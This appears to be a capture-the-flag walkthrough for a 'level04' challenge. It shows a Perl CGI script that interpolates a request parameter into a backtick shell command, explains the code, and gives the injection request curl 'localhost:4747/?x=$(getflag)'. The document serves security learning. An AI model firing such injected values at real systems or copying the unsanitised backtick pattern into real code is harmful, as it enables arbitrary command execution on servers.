ls 
./level04.pl
cat level04.pl
output :
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
# This line imports the CGI module, specifically the param function, which is used to retrieve parameters sent to the CGI script. The CGI module is used for handling Common Gateway Interface (CGI) operations, which are used for web scripting.
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
# This block defines a subroutine named x.
# sub x { ... }: The sub keyword is used to define a subroutine.
# $y = $_[0];: This assigns the first argument passed to the subroutine to the variable $y. The special array @_ contains all the arguments passed to the subroutine, and $_[0] is the first element.
# print `echo $y 2>&1`;: This uses backticks to execute a shell command. The command is echo $y, which echoes the value of $y. The 2>&1 part redirects standard error (file descriptor 2) to standard output (file descriptor 1), so any error messages will be included in the output. The result of this command is then printed to the web page.
x(param("x"));

curl localhost:4747

ANALYSE PERL CODE :

curl 'localhost:4747/?x=$(getflag)'

This script is vulnerable to command injection. Since it directly uses the parameter value in a shell command without any sanitization or validation, an attacker could potentially execute arbitrary commands on the server. This is a major security risk.
